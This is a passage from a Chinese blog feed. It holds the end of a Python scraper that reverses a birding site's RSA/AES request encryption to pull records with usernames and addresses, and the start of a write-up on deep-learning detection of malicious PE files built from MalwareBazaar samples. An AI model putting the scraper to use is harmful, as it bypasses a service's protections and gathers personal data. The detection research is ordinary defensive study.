class="line">                <span class="variable language_">self</span>.api_url,</span><br><span class="line">                headers=headers,</span><br><span class="line">                data=encrypted_data,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># =================================================================</span></span><br><span class="line">            <span class="comment"># 步骤8: 处理响应</span></span><br><span class="line">            <span class="comment"># =================================================================</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                response_text = response.text</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n📥 收到响应:&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   响应长度: <span class="subst">&#123;<span class="built_in">len</span>(response_text)&#125;</span> 字符&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 尝试解析JSON</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    result = json.loads(response_text)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># 情况1: 整个响应是加密的字符串</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">str</span>):</span><br><span class="line">                        <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&quot;   检测到: 整个响应是加密字符串&quot;</span>)</span><br><span class="line">                        decrypted = <span class="variable language_">self</span>.decrypt_response(result)</span><br><span class="line">                        <span class="keyword">if</span> decrypted:</span><br><span class="line">                            <span class="keyword">return</span> json.loads(decrypted)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># 情况2: 响应是字典，data字段是加密的</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;data&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">isinstance</span>(result[<span class="string">&#x27;data&#x27;</span>], <span class="built_in">str</span>):</span><br><span class="line">                            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;   检测到: data字段是加密字符串&quot;</span>)</span><br><span class="line">                            decrypted = <span class="variable language_">self</span>.decrypt_response(result[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line">                            <span class="keyword">if</span> decrypted:</span><br><span class="line">                                result[<span class="string">&#x27;data&#x27;</span>] = json.loads(decrypted)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># 情况3: 响应未加密或已解密</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="comment"># 情况4: 响应不是JSON，可能是纯加密文本</span></span><br><span class="line">                    <span class="comment"># -------------------------------------------------------------</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;   检测到: 响应不是JSON格式&quot;</span>)</span><br><span class="line">                    decrypted = <span class="variable language_">self</span>.decrypt_response(response_text)</span><br><span class="line">                    <span class="keyword">if</span> decrypted:</span><br><span class="line">                        <span class="keyword">return</span> json.loads(decrypted)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;❌ HTTP错误: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;❌ 请求出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.debug:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># 测试函数</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_encryption</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试RSA加密功能&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;测试 RSA 加密&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    </span><br><span class="line">    api = BirdReportAPI(debug=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 测试数据</span></span><br><span class="line">    test_data = <span class="string">&#x27;&#123;&quot;limit&quot;:&quot;20&quot;,&quot;page&quot;:&quot;1&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n原始数据: <span class="subst">&#123;test_data&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加密</span></span><br><span class="line">    encrypted = api.encrypt_long(test_data)</span><br><span class="line">    <span class="keyword">if</span> encrypted:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n✅ 加密成功!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加密结果（前100字符）: <span class="subst">&#123;encrypted[:<span class="number">100</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加密长度: <span class="subst">&#123;<span class="built_in">len</span>(encrypted)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n❌ 加密失败&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;测试完整流程&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BirdReport API 爬虫 - 完整测试&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建API实例（开启调试模式）</span></span><br><span class="line">    api = BirdReportAPI(debug=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n🔑 密钥信息:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES Key: <span class="subst">&#123;api.aes_key_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(api.aes_key)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES IV:  <span class="subst">&#123;api.aes_iv_str&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(api.aes_iv)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n搜索活动 (page=1, limit=20):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 执行搜索</span></span><br><span class="line">    result = api.search(page=<span class="number">1</span>, limit=<span class="number">20</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 处理结果</span></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n✅ 请求成功&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(result, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="comment"># 检查 API 返回码</span></span><br><span class="line">            <span class="keyword">if</span> result.get(<span class="string">&#x27;code&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;✅ API返回成功&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;总数据量: <span class="subst">&#123;result.get(<span class="string">&#x27;count&#x27;</span>, <span class="number">0</span>):,&#125;</span> 条&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> result.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">                    data = result[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">list</span>):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;当前页返回: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 条记录&quot;</span>)</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;\n📋 第一条记录示例:&quot;</span>)</span><br><span class="line">                            first = data[<span class="number">0</span>]</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   编号: <span class="subst">&#123;first.get(<span class="string">&#x27;serialId&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   用户: <span class="subst">&#123;first.get(<span class="string">&#x27;username&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   地点: <span class="subst">&#123;first.get(<span class="string">&#x27;pointName&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   地址: <span class="subst">&#123;first.get(<span class="string">&#x27;address&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   时间: <span class="subst">&#123;first.get(<span class="string">&#x27;startTime&#x27;</span>)&#125;</span> - <span class="subst">&#123;first.get(<span class="string">&#x27;endTime&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;   物种数: <span class="subst">&#123;first.get(<span class="string">&#x27;taxonCount&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;数据类型: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;❌ API错误 (code=<span class="subst">&#123;result.get(<span class="string">&#x27;code&#x27;</span>)&#125;</span>): <span class="subst">&#123;result.get(<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;未知错误&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 显示完整响应（可选）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span>:  <span class="comment"># 设置为True可查看完整JSON</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n完整响应:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(json.dumps(result, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n❌ 请求失败&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 运行完整测试</span></span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果只想测试加密，取消下面的注释</span></span><br><span class="line">    <span class="comment"># test_encryption()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先分析header头部的sign和requestID如何加密的，然后分析如何参数加密。&lt;/p&gt;
&lt;p&gt;然后进行返回值的AES解密即可。&lt;/p&gt;
&lt;p&gt;比较简单适合入门学习。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.co</summary>
      
    
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JS逆向" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>nature论文汇报</title>
    <link href="https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/</id>
    <published>2025-10-15T14:24:09.000Z</published>
    <updated>2025-10-15T14:24:53.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE恶意代码检测系统-基于深度学习的研究项目"><a href="#PE恶意代码检测系统-基于深度学习的研究项目" class="headerlink" title="PE恶意代码检测系统 - 基于深度学习的研究项目"></a>PE恶意代码检测系统 - 基于深度学习的研究项目</h1><h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本项目是一个基于深度学习的PE（Portable Executable）恶意代码检测系统，旨在通过多种深度学习算法对Windows可执行文件进行恶意性检测。项目采用了全面的实验设计，比较了10种不同的深度学习模型在恶意代码检测任务上的性能表现。</p><h2 id="🎯-研究目标"><a href="#🎯-研究目标" class="headerlink" title="🎯 研究目标"></a>🎯 研究目标</h2><ul><li><strong>主要目标</strong>：构建高效的PE恶意代码检测系统</li><li><strong>技术目标</strong>：比较多种深度学习模型的检测性能</li><li><strong>学术目标</strong>：为恶意代码检测领域提供全面的模型性能基准</li></ul><h2 id="📊-数据集构建"><a href="#📊-数据集构建" class="headerlink" title="📊 数据集构建"></a>📊 数据集构建</h2><h3 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h3><ul><li><strong>恶意样本来源</strong>：MalwareBazaar数据库（abuse.ch）</li><li><strong>时间范围</strong>：2020年2月-6月的恶意样本</li><li><strong>样本数量</strong>：约10,000+恶意样本</li><li><strong>正常样本</strong>：系统PE文件和合法软件</li></ul><h3 id="数据预处理流程"><a href="#数据预处理流程" class="headerlink" title="数据预处理流程"></a>数据预处理流程</h3><ol><li><strong>样本下载与解压</strong>：自动化下载指定日期范围的恶意样本</li><li><strong>PE文件验证</strong>：验证文件格式的有效性</li><li><strong>特征提取</strong>：从PE文件结构中提取58个静态特征</li><li><strong>数据清洗</strong>：处理缺失值和异常值</li></ol><h2 id="🔧-特征工程"><a href="#🔧-特征工程" class="headerlink" title="🔧 特征工程"></a>🔧 特征工程</h2><h3 id="PE文件特征体系"><a href="#PE文件特征体系" class="headerlink" title="PE文件特征体系"></a>PE文件特征体系</h3><p>项目提取了58个PE文件静态特征，涵盖以下几个维度：</p><h4 id="1-DOS头特征（17个）"><a href="#1-DOS头特征（17个）" class="headerlink" title="1. DOS头特征（17个）"></a>1. DOS头特征（17个）</h4><ul><li><code>e_magic</code>：DOS签名</li><li><code>e_cblp</code>：最后一页字节数</li><li><code>e_cp</code>：文件页数</li><li><code>e_lfanew</code>：PE头偏移</li><li>等其他DOS头字段</li></ul><h4 id="2-NT头特征（7个）"><a href="#2-NT头特征（7个）" class="headerlink" title="2. NT头特征（7个）"></a>2. NT头特征（7个）</h4><ul><li><code>machine</code>：目标机器类型</li><li><code>number_of_sections</code>：节区数量</li><li><code>time_date_stamp</code>：时间戳</li><li><code>characteristics</code>：文件特征标志</li><li>等</li></ul><h4 id="3-可选头特征（28个）"><a href="#3-可选头特征（28个）" class="headerlink" title="3. 可选头特征（28个）"></a>3. 可选头特征（28个）</h4><ul><li><code>size_of_code</code>：代码段大小</li><li><code>size_of_image</code>：映像大小</li><li><code>address_of_entry_point</code>：入口点地址</li><li><code>subsystem</code>：子系统类型</li><li>等</li></ul><h4 id="4-节区统计特征（6个）"><a href="#4-节区统计特征（6个）" class="headerlink" title="4. 节区统计特征（6个）"></a>4. 节区统计特征（6个）</h4><ul><li><code>avg_section_entropy</code>：平均节区熵值</li><li><code>max_section_entropy</code>：最大节区熵值</li><li><code>total_virtual_size</code>：总虚拟大小</li><li><code>virtual_raw_ratio</code>：虚拟&#x2F;实际大小比率</li><li>等</li></ul><h3 id="数据预处理策略"><a href="#数据预处理策略" class="headerlink" title="数据预处理策略"></a>数据预处理策略</h3><ul><li><strong>缩放方法</strong>：标准化、最小-最大缩放、无缩放</li><li><strong>特征选择</strong>：PCA降维、LDA降维、无降维</li><li><strong>组合策略</strong>：3×3&#x3D;9种预处理组合</li></ul><h2 id="🤖-深度学习模型架构"><a href="#🤖-深度学习模型架构" class="headerlink" title="🤖 深度学习模型架构"></a>🤖 深度学习模型架构</h2><p>项目实现了10种不同的深度学习模型：</p><h3 id="1-卷积神经网络（CNN）"><a href="#1-卷积神经网络（CNN）" class="headerlink" title="1. 卷积神经网络（CNN）"></a>1. 卷积神经网络（CNN）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Conv1D(<span class="number">64</span>, <span class="number">3</span>) + BatchNorm + MaxPooling</span><br><span class="line">- Conv1D(<span class="number">32</span>, <span class="number">3</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-长短期记忆网络（LSTM）"><a href="#2-长短期记忆网络（LSTM）" class="headerlink" title="2. 长短期记忆网络（LSTM）"></a>2. 长短期记忆网络（LSTM）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- LSTM(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- LSTM(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="3-循环神经网络（RNN）"><a href="#3-循环神经网络（RNN）" class="headerlink" title="3. 循环神经网络（RNN）"></a>3. 循环神经网络（RNN）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- SimpleRNN(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- SimpleRNN(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="4-多层感知器（MLP）"><a href="#4-多层感知器（MLP）" class="headerlink" title="4. 多层感知器（MLP）"></a>4. 多层感知器（MLP）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Dense(<span class="number">256</span>) + BatchNorm + Dropout(<span class="number">0.4</span>)</span><br><span class="line">- Dense(<span class="number">128</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">64</span>) + Dropout(<span class="number">0.2</span>) + Dense(<span class="number">32</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="5-自组织映射网络（SOM）"><a href="#5-自组织映射网络（SOM）" class="headerlink" title="5. 自组织映射网络（SOM）"></a>5. 自组织映射网络（SOM）</h3><ul><li>自适应网格大小设计</li><li>12×12映射层用于特征可视化</li></ul><h3 id="6-深度信念网络（DBN）"><a href="#6-深度信念网络（DBN）" class="headerlink" title="6. 深度信念网络（DBN）"></a>6. 深度信念网络（DBN）</h3><ul><li>多层sigmoid激活</li><li>逐层预训练架构</li></ul><h3 id="7-受限玻尔兹曼机（RBM）"><a href="#7-受限玻尔兹曼机（RBM）" class="headerlink" title="7. 受限玻尔兹曼机（RBM）"></a>7. 受限玻尔兹曼机（RBM）</h3><ul><li>200→100→50的层次结构</li><li>sigmoid激活函数</li></ul><h3 id="8-自动编码器（AutoEncoder）"><a href="#8-自动编码器（AutoEncoder）" class="headerlink" title="8. 自动编码器（AutoEncoder）"></a>8. 自动编码器（AutoEncoder）</h3><ul><li>编码器：128→64→32</li><li>分类器：16→1</li></ul><h3 id="9-GAN判别器"><a href="#9-GAN判别器" class="headerlink" title="9. GAN判别器"></a>9. GAN判别器</h3><ul><li>256→128→64的判别网络</li><li>适用于对抗性训练</li></ul><h3 id="10-径向基函数网络（RBFN）"><a href="#10-径向基函数网络（RBFN）" class="headerlink" title="10. 径向基函数网络（RBFN）"></a>10. 径向基函数网络（RBFN）</h3><ul><li>100个径向基单元</li><li>高斯核函数</li></ul><h2 id="📈-实验设计与结果"><a href="#📈-实验设计与结果" class="headerlink" title="📈 实验设计与结果"></a>📈 实验设计与结果</h2><h3 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h3><ul><li><strong>训练集&#x2F;测试集</strong>：80%&#x2F;20%分割</li><li><strong>交叉验证</strong>：分层K折验证</li><li><strong>优化器</strong>：Adam优化器</li><li><strong>学习率</strong>：0.001（部分模型0.0002）</li><li><strong>批次大小</strong>：32</li><li><strong>早停机制</strong>：patience&#x3D;10</li><li><strong>学习率调度</strong>：ReduceLROnPlateau</li></ul><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><ul><li><strong>准确率（Accuracy）</strong></li><li><strong>精确率（Precision）</strong></li><li><strong>召回率（Recall）</strong></li><li><strong>F1分数</strong></li><li><strong>AUC-ROC</strong></li></ul><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>根据实验结果，各模型性能排名如下：</p><table><thead><tr><th>排名</th><th>模型</th><th>准确率</th><th>精确率</th><th>召回率</th><th>F1分数</th><th>AUC</th></tr></thead><tbody><tr><td>1</td><td>CNN</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>0.999</td></tr><tr><td>2</td><td>SOM</td><td>98.75%</td><td>98.76%</td><td>98.75%</td><td>98.75%</td><td>0.999</td></tr><tr><td>3</td><td>MLP</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>0.998</td></tr><tr><td>4</td><td>RBM</td><td>98.25%</td><td>98.26%</td><td>98.25%</td><td>98.25%</td><td>0.999</td></tr><tr><td>5</td><td>DBN</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>6</td><td>GAN判别器</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>7</td><td>RNN</td><td>98.0%</td><td>98.02%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>8</td><td>AutoEncoder</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>0.998</td></tr><tr><td>9</td><td>LSTM</td><td>96.75%</td><td>96.78%</td><td>96.75%</td><td>96.75%</td><td>0.995</td></tr><tr><td>10</td><td>RBFN</td><td>50.0%</td><td>25.0%</td><td>50.0%</td><td>33.33%</td><td>0.5</td></tr></tbody></table><h2 id="🔍-关键发现"><a href="#🔍-关键发现" class="headerlink" title="🔍 关键发现"></a>🔍 关键发现</h2><h3 id="1-模型性能分析"><a href="#1-模型性能分析" class="headerlink" title="1. 模型性能分析"></a>1. 模型性能分析</h3><ul><li><strong>CNN表现最优</strong>：在所有指标上都达到了99%的性能</li><li><strong>传统神经网络效果良好</strong>：SOM、MLP等简单模型也达到了98%+的准确率</li><li><strong>序列模型表现中等</strong>：LSTM、RNN在静态特征上表现不如CNN</li><li><strong>RBFN性能较差</strong>：可能由于径向基函数不适合此类特征</li></ul><h3 id="2-特征工程影响"><a href="#2-特征工程影响" class="headerlink" title="2. 特征工程影响"></a>2. 特征工程影响</h3><ul><li><strong>标准化效果显著</strong>：大多数模型在标准化后性能提升</li><li><strong>PCA降维有效</strong>：在保持性能的同时减少了计算复杂度</li><li><strong>LDA效果有限</strong>：由于是二分类问题，LDA降维效果不明显</li></ul><h3 id="3-技术创新点"><a href="#3-技术创新点" class="headerlink" title="3. 技术创新点"></a>3. 技术创新点</h3><ul><li><strong>全面的模型比较</strong>：首次在PE恶意代码检测中比较10种深度学习模型</li><li><strong>自动化特征提取</strong>：完整的PE文件特征提取pipeline</li><li><strong>多维度评估</strong>：从准确率、效率、鲁棒性多角度评估模型</li></ul><h2 id="🛠-技术架构"><a href="#🛠-技术架构" class="headerlink" title="🛠 技术架构"></a>🛠 技术架构</h2><h3 id="系统组件"><a href="#系统组件" class="headerlink" title="系统组件"></a>系统组件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">恶意代码检测系统</span><br><span class="line">├── 数据采集模块</span><br><span class="line">│   ├── 样本下载器 (指定日期下载文件并解压.py)</span><br><span class="line">│   └── PE文件验证器 (copy.py)</span><br><span class="line">├── 特征提取模块</span><br><span class="line">│   ├── PE解析器 (PEFeatureExtractor)</span><br><span class="line">│   └── 特征工程 (preprocess_data)</span><br><span class="line">├── 模型训练模块</span><br><span class="line">│   ├── 10种深度学习模型</span><br><span class="line">│   └── 超参数优化</span><br><span class="line">├── 评估分析模块</span><br><span class="line">│   ├── 性能指标计算</span><br><span class="line">│   ├── 可视化分析</span><br><span class="line">│   └── 结果导出</span><br><span class="line">└── 工具模块</span><br><span class="line">    ├── 文件统计 (统计目录下pe文件数量.py)</span><br><span class="line">    └── 数据管理</span><br></pre></td></tr></table></figure><h3 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h3><ul><li><strong>Python 3.8+</strong></li><li><strong>TensorFlow 2.x</strong></li><li><strong>scikit-learn</strong></li><li><strong>pandas, numpy</strong></li><li><strong>matplotlib, seaborn</strong></li><li><strong>pefile</strong>（PE文件解析）</li><li><strong>pyzipper</strong>（样本解压）</li></ul><h2 id="📋-项目文件结构"><a href="#📋-项目文件结构" class="headerlink" title="📋 项目文件结构"></a>📋 项目文件结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pythonProject/</span><br><span class="line">├── main.py                          # 主程序（完整的检测系统）</span><br><span class="line">├── nature训练PE检测代码.py            # 优化版检测代码</span><br><span class="line">├── 指定日期下载文件并解压.py          # 样本下载工具</span><br><span class="line">├── copy.py                          # PE文件收集工具</span><br><span class="line">├── 统计目录下pe文件数量.py           # 统计工具</span><br><span class="line">├── pe_malware_results.csv           # 实验结果</span><br><span class="line">├── downloads/                       # 下载的样本压缩包</span><br><span class="line">├── extracted_samples/               # 解压的恶意样本</span><br><span class="line">├── valid_pe_files_bin/             # 有效PE文件（.bin格式）</span><br><span class="line">├── 